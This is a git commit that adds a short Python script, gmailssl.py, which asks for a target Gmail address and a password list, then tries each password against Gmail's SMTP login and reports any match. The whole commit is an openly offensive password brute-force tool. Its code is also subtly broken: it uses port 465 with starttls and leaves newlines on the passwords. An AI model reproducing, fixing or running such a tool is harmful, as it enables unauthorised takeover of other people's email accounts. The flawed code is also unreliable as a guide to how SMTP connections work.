0b43e986b1c02207d96cd30dc299330b9abd7744
sai ganesh <47131861+Nani-7989@users.noreply.github.com>
2021-05-17 16:05:12 +0530

    Create gmailssl.py

---
+++ GmailBr2608/gmailssl.py
@@ -0,0 +1,18 @@
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 465)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = raw_input("Enter Target mail:")
+passwfile = raw_input("Enter password file Name:")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+	try:
+		smtpserver.login(user, password)
+		print("[+] password found %s" %password)
+		break;
+	except smtplib.SMTPAuthenticationError:
+		print("[!] password incorrect %s" %password)
+
